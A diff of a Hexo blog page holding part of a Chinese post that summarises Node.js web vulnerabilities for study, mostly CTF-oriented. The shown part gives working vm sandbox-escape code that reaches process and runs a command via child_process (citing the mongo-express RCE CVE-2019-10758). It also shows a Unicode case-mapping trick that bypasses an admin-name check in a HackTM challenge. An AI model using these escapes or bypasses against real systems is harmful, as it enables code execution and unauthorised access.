+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&apos;vm&apos;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> sandbox = {};</span><br><span class="line"><span class="hljs-keyword">const</span> script = <span class="hljs-keyword">new</span> vm.Script(<span class="hljs-string">&quot;this.constructor.constructor(&apos;return this.process.env&apos;)()&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> context = vm.createContext(sandbox);</span><br><span class="line">env = script.runInContext(context);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<p>&#x521B;&#x5EFA;vm&#x73AF;&#x5883;&#x65F6;&#xFF0C;&#x9996;&#x5148;&#x8981;&#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;&#x5BF9;&#x8C61; sandbox&#xFF0C;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x5C31;&#x662F;vm&#x4E2D;&#x811A;&#x672C;&#x6267;&#x884C;&#x65F6;&#x7684;&#x5168;&#x5C40;&#x73AF;&#x5883;context&#xFF0C;vm &#x811A;&#x672C;&#x4E2D;&#x5168;&#x5C40; this &#x6307;&#x5411;&#x7684;&#x5C31;&#x662F;&#x8FD9;&#x4E2A;&#x5BF9;&#x8C61;&#x3002;</p>
+<p>&#x56E0;&#x4E3A;<code>this.constructor.constructor</code>&#x8FD4;&#x56DE;&#x7684;&#x662F;&#x4E00;&#x4E2A;<code>Function constructor</code>&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x5229;&#x7528;Function&#x5BF9;&#x8C61;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x5E76;&#x6267;&#x884C;&#x3002;(&#x6B64;&#x65F6;Function&#x5BF9;&#x8C61;&#x7684;&#x4E0A;&#x4E0B;&#x6587;&#x73AF;&#x5883;&#x662F;&#x5904;&#x4E8E;&#x4E3B;&#x7A0B;&#x5E8F;&#x4E2D;&#x7684;) &#x8FD9;&#x91CC;&#x6784;&#x9020;&#x7684;&#x51FD;&#x6570;&#x5185;&#x7684;&#x8BED;&#x53E5;&#x662F;<code>return this.process.env</code>&#xFF0C;&#x7ED3;&#x679C;&#x662F;&#x8FD4;&#x56DE;&#x4E86;&#x4E3B;&#x7A0B;&#x5E8F;&#x7684;&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x3002;</p>
+<p>&#x914D;&#x5408;<code>chile_process.exec()</code>&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EFB;&#x610F;&#x547D;&#x4EE4;&#x4E86;&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="hljs-keyword">const</span> env = vm.runInNewContext(<span class="hljs-string">`const process = this.constructor.constructor(&apos;return this.process&apos;)();</span></span><br><span class="line"><span class="hljs-string">process.mainModule.require(&apos;child_process&apos;).execSync(&apos;whoami&apos;).toString()`</span>);</span><br><span class="line"><span class="hljs-built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<p>&#x6700;&#x8FD1;&#x7684;mongo-express RCE(CVE-2019-10758)&#x6F0F;&#x6D1E;&#x5C31;&#x662F;&#x914D;&#x5408;vm&#x6C99;&#x7BB1;&#x9003;&#x9038;&#x6765;&#x5229;&#x7528;&#x7684;&#x3002;</p>
+<p>&#x5177;&#x4F53;&#x5206;&#x6790;&#x53EF;&#x53C2;&#x8003;&#xFF1A;<a href="https://xz.aliyun.com/t/7056" target="_blank" rel="noopener">CVE-2019-10758:mongo-expressRCE&#x590D;&#x73B0;&#x5206;&#x6790;</a></p>
+<h2 id="javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;"><a href="#javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;" class="headerlink" title="javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;"></a>javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;</h2><p>&#x5728;javascript&#x4E2D;&#x6709;&#x51E0;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x5B57;&#x7B26;&#x9700;&#x8981;&#x8BB0;&#x5F55;&#x4E00;&#x4E0B;</p>
+<p>&#x5BF9;&#x4E8E;toUpperCase():</p>
+<pre><code>&#x5B57;&#x7B26;&quot;&#x131;&quot;&#x3001;&quot;&#x17F;&quot; &#x7ECF;&#x8FC7;toUpperCase&#x5904;&#x7406;&#x540E;&#x7ED3;&#x679C;&#x4E3A; &quot;I&quot;&#x3001;&quot;S&quot;
+</code></pre><p>&#x5BF9;&#x4E8E;toLowerCase():</p>
+<pre><code>&#x5B57;&#x7B26;&quot;&#x212A;&quot;&#x7ECF;&#x8FC7;toLowerCase&#x5904;&#x7406;&#x540E;&#x7ED3;&#x679C;&#x4E3A;&quot;k&quot;(&#x8FD9;&#x4E2A;&#x212A;&#x4E0D;&#x662F;K)
+</code></pre><p>&#x5728;&#x7ED5;&#x4E00;&#x4E9B;&#x89C4;&#x5219;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x53EF;&#x4EE5;&#x5229;&#x7528;&#x8FD9;&#x51E0;&#x4E2A;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;</p>
+<p><strong>CTF&#x9898;&#x5B9E;&#x4F8B; - Hacktm&#x4E2D;&#x7684;&#x4E00;&#x9053;Nodejs&#x9898;</strong></p>
+<p>&#x9898;&#x76EE;&#x90E8;&#x5206;&#x6E90;&#x7801;&#xFF1A;</p>
+<figure class="highlight js hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidUser</span>(<span class="hljs-params">u</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> (</span><br><span class="line">    u.username.length &gt;= <span class="hljs-number">3</span> &amp;&amp;</span><br><span class="line">    u.username.toUpperCase() !== config.adminUsername.toUpperCase()</span><br><span class="line">  );</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAdmin</span>(<span class="hljs-params">u</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">return</span> u.username.toLowerCase() == config.adminUsername.toLowerCase();</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x89E3;&#x9898;&#x65F6;&#x9700;&#x8981;&#x767B;&#x5F55;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x7528;&#x6237;&#x540D;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x767B;&#x5F55;&#x65F6;&#xFF0C;<code>isValidUser</code>&#x51FD;&#x6570;&#x4F1A;&#x5BF9;&#x7528;&#x6237;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;<code>toUpperCase</code>&#x5904;&#x7406;&#xFF0C;&#x518D;&#x4E0E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;&#x5BF9;&#x6BD4;&#x3002;&#x5982;&#x679C;&#x8F93;&#x5165;&#x7684;&#x7528;&#x6237;&#x540D;&#x4E0E;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x76F8;&#x540C;&#xFF0C;&#x5C31;&#x4E0D;&#x5141;&#x8BB8;&#x767B;&#x5F55;&#x3002;</p>
+<p>&#x4F46;&#x662F;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5728;&#x4E4B;&#x540E;&#x7684;&#x4E00;&#x4E2A;&#x5224;&#x65AD;&#x7528;&#x6237;&#x662F;&#x5426;&#x4E3A;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x5BF9;&#x7528;&#x6237;&#x540D;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x7684;&#x662F;<code>toLowerCase</code>&#x3002;&#x6240;&#x4EE5;&#x8FD9;&#x4E24;&#x4E2A;&#x5DEE;&#x5F02;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;&#x6765;&#x8FDB;&#x884C;&#x7ED5;&#x8FC7;&#x3002;</p>
+<p>&#x9898;&#x76EE;&#x4E2D;&#x9ED8;&#x8BA4;&#x7684;&#x7BA1;&#x7406;&#x5458;&#x7528;&#x6237;&#x540D;&#x4E3A;&#xFF1A;hacktm</p>
+<p>&#x6240;&#x4EE5;&#xFF0C;&#x6211;&#x4EEC;&#x6307;&#x5B9A;&#x767B;&#x5F55;&#x65F6;&#x7684;&#x7528;&#x6237;&#x540D;&#x4E3A;&#xFF1A;hac&#x212A;tm &#x5373;&#x53EF;&#x7ED5;&#x8FC7;<code>isValidUser</code>&#x548C;<code>isAdmin</code>&#x7684;&#x9A8C;&#x8BC1;&#x3002;</p>
+<p>&#x9898;&#x76EE;&#x5B8C;&#x6574;Writeup&#xFF1A;</p>
+<h2 id="&#x8BF4;&#x5728;&#x6700;&#x540E;"><a href="#&#x8BF4;&#x5728;&#x6700;&#x540E;" class="headerlink" title="&#x8BF4;&#x5728;&#x6700;&#x540E;"></a>&#x8BF4;&#x5728;&#x6700;&#x540E;</h2><p>&#x6700;&#x8FD1;&#x624D;&#x521A;&#x5F00;&#x59CB;&#x5B66;&#x4E60;Node.js&#xFF0C;&#x6253;&#x7B97;&#x8D81;&#x5BD2;&#x5047;&#x8FD9;&#x6BB5;&#x65F6;&#x95F4;&#x628A;&#x5E38;&#x89C1;&#x7684;&#x51E0;&#x4E2A;&#x6F0F;&#x6D1E;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#x3002;&#x5982;&#x679C;&#x6587;&#x7AE0;&#x4E2D;&#x51FA;&#x73B0;&#x4E86;&#x9519;&#x8BEF;&#xFF0C;&#x8FD8;&#x5E0C;&#x671B;&#x5E08;&#x5085;&#x4EEC;&#x80FD;&#x591F;&#x76F4;&#x63A5;&#x6307;&#x51FA;&#x6765;&#xFF0C;&#x5341;&#x5206;&#x611F;&#x8C22;&#xFF01;</p>
+<h2 id="&#x53C2;&#x8003;"><a href="#&#x53C2;&#x8003;" class="headerlink" title="&#x53C2;&#x8003;"></a>&#x53C2;&#x8003;</h2><ul>
+<li><a href="https://www.freebuf.com/articles/web/152891.html" target="_blank" rel="noopener">&#x6D45;&#x8C08;Node.js Web&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898;</a></li>
+<li><a href="https://www.freebuf.com/articles/web/200406.html" target="_blank" rel="noopener">&#x6DF1;&#x5165;&#x7406;&#x89E3;JavaScript Prototype&#x6C61;&#x67D3;&#x653B;&#x51FB;</a></li>
+<li><a href="https://paper.seebug.org/213/" target="_blank" rel="noopener">&#x5229;&#x7528; Node.js &#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x8FDC;&#x7A0B;&#x6267;&#x884C;&#x4EE3;&#x7801;</a></li>
 <li><a href="https://pwnisher.gitlab.io/nodejs/sandbox/2019/02/21/sandboxing-nodejs-is-hard.html" target="_blank" rel="noopener">Sandboxing NodeJS is hard, here is why</a></li>
 <li><a href="https://segmentfault.com/a/1190000012672620" target="_blank" rel="noopener">https://segmentfault.com/a/1190000012672620</a></li>
-<li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">Fuzz中的javascript大小写特性</a></li>
+<li><a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html" target="_blank" rel="noopener">Fuzz&#x4E2D;&#x7684;javascript&#x5927;&#x5C0F;&#x5199;&#x7279;&#x6027;</a></li>
 </ul>
 
+    
     </div>
-
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/tags/node-js/">#node.js</a></span>
+    
+    </div>
     
     
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop  article-nav-prev">
+            
+            <a href="/2020/02/02/Hacktm-Nodejs/">Hacktm中一道Node.js题分析(Draw with us)</a>
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2019/12/18/论如何优雅的复制一个网站的所有页面/">Python之如何优雅的复制一个网站的所有页面</a>
+            
+        </span>
+    </div>
     
-        
-      
+</article>
 
-      <footer class="post-footer">
-          
-            
-          
-          <div class="post-tags">
-            
-              <a href="/tags/总结/" rel="tag"># 总结</a>
-            
-          </div>
-        
 
-        
 
-          <div class="post-nav">
-            <div class="post-nav-next post-nav-item">
-              
-                <a href="/2019/12/18/论如何优雅的复制一个网站的所有页面/" rel="next" title="Python之如何优雅的复制一个网站的所有页面">
-                  <i class="fa fa-chevron-left"></i> Python之如何优雅的复制一个网站的所有页面
-                </a>
-              
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2020 Threezh1&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
             </div>
+            <div class="column is-hidden-mobile"></div>
 
-            <span class="post-nav-divider"></span>
-
-            <div class="post-nav-prev post-nav-item">
-              
-                <a href="/2020/02/02/Hacktm-Nodejs/" rel="prev" title="Hacktm中一道Node.js题分析(Draw with us)">
-                  Hacktm中一道Node.js题分析(Draw with us) <i class="fa fa-chevron-right"></i>
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow has-text-black" title="GitHub" href="https://github.com/Threezh1">
+                    
+                    GitHub
+                    
                 </a>
-              
+                
+                </div>
             </div>
-          </div>
-        
-      </footer>
-    
-  </div>
-  
-  
-  
-  </article>
-
-  </div>
-
-
-          </div>
-          
-
+            
+            
         </div>
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
     </div>
-  </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script>
 
-  <aside id="sidebar" class="sidebar">
-    <div class="sidebar-inner">
-        
-        
-        
-        
-      
-
-      <ul class="sidebar-nav motion-element">
-        <li class="sidebar-nav-toc" data-target="post-toc-wrap">
-          Inhaltsverzeichnis
-        </li>
-        <li class="sidebar-nav-overview" data-target="site-overview-wrap">
-          Übersicht
-        </li>
-      </ul>
-
-      <!--noindex-->
-      <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc">
-            <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#危险函数所导致的命令执行"><span class="nav-number">1.</span> <span class="nav-text">危险函数所导致的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval"><span class="nav-number">1.1.</span> <span class="nav-text">eval()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#类似命令"><span class="nav-number">1.2.</span> <span class="nav-text">类似命令</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Node-js-原型污染漏洞"><span class="nav-number">2.</span> <span class="nav-text">Node.js 原型污染漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#关于原型链"><span class="nav-number">2.1.</span> <span class="nav-text">关于原型链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#原型链污染原理"><span class="nav-number">2.2.</span> <span class="nav-text">原型链污染原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#merge操作导致原型链污染"><span class="nav-number">2.3.</span> <span class="nav-text">merge操作导致原型链污染</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Code-Breaking-2018-Thejs"><span class="nav-number">2.4.</span> <span class="nav-text">Code-Breaking 2018 Thejs</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#node-serialize反序列化RCE漏洞-CVE-2017-5941"><span class="nav-number">3.</span> <span class="nav-text">node-serialize反序列化RCE漏洞(CVE-2017-5941)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Node-js-目录穿越漏洞复现-CVE-2017-14849"><span class="nav-number">4.</span> <span class="nav-text">Node.js 目录穿越漏洞复现(CVE-2017-14849)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#vm沙箱逃逸"><span class="nav-number">5.</span> <span class="nav-text">vm沙箱逃逸</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#javascript大小写特性"><span class="nav-number">6.</span> <span class="nav-text">javascript大小写特性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#说在最后"><span class="nav-number">7.</span> <span class="nav-text">说在最后</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
-          </div>
-        
-      </div>
-      <!--/noindex-->
-
-      <div class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">Threezh1</p>
-  <div class="site-description motion-element" itemprop="description">Share learn & Share life.</div>
+<!-- test if the browser is outdated -->
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
 </div>
-  <nav class="site-state motion-element">
-      <div class="site-state-item site-state-posts">
-        
-          <a href="/archives/">
-        
-          <span class="site-state-item-count">34</span>
-          <span class="site-state-item-name">Artikel</span>
-        </a>
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-categories">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">7</span>
-        <span class="site-state-item-name">Kategorien</span>
-        
-      </div>
-    
-      
-      
-      <div class="site-state-item site-state-tags">
-        
-        
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-          
-        
-        <span class="site-state-item-count">21</span>
-        <span class="site-state-item-name">schlagwörter</span>
-        
-      </div>
-    
-  </nav>
-  <div class="links-of-author motion-element">
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://github.com/Threezh1" title="GitHub &rarr; https://github.com/Threezh1" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
-      </span>
-    
-      <span class="links-of-author-item">
-      
-      
-        
-      
-      
-        
-      
-        <a href="https://weibo.com/u/5515566558" title="Weibo &rarr; https://weibo.com/u/5515566558" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
-      </span>
-    
-  </div>
+<script src="//cdnjs.cloudflare.com/ajax/libs/outdated-browser/1.1.5/outdatedbrowser.min.js"></script>
+<script>
+    $(document).ready(function () {
+        // plugin function, place inside DOM ready function
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        })
+    });
+</script>
+
+<script>
+    window.FontAwesomeConfig = {
+        searchPseudoElements: true
+    }
+    moment.locale("chinese");
+</script>
 
 
+    
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+<script>
+    MathJax.Hub.Config({
+        "HTML-CSS": {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+</script>
 
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css" integrity="sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y" crossorigin="anonymous">
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js" integrity="sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx" crossorigin="anonymous"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js" integrity="sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe" crossorigin="anonymous" onload="renderMathInElement(document.body);"></script>
+
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    renderMathInElement(document.body, {
+        // ...options...
+    });
+});
+</script>
+
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script src="//cdnjs.cloudflare.com/ajax/libs/justifiedGallery/3.6.5/js/jquery.justifiedGallery.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof($.fn.justifiedGallery) === 'function') {
+                $('.justified-gallery').justifiedGallery();
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+
+
+<script src="/js/script.js"></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-mask"></div>
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Escribe algo...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
-      </div>
-
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
     </div>
-  </aside>
-  <div id="sidebar-dimmer"></div>
-
-
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love" id="animate">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">Threezh1</span>
 </div>
-  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
-  <span class="post-meta-divider">|</span>
-  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> v7.3.0</div>
-
-        
-
-
-
-
-
-
-
-
-
-
-
-
-        
-      </div>
-    </footer>
-
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Tags',
+                UNTITLED: '(Sin título)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js"></script>
     
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-  </div>
-
-  
-  <script src="/lib/jquery/index.js?v=3.4.1"></script>
-  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-<script src="/js/utils.js?v=7.3.0"></script><script src="/js/motion.js?v=7.3.0"></script>
-<script src="/js/schemes/pisces.js?v=7.3.0"></script>
-<script src="/js/next-boot.js?v=7.3.0"></script>
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-  
-
-  
-
-
-  
-  <script src="/js/post-details.js?v=7.3.0"></script>
-
-
 </body>
 </html>
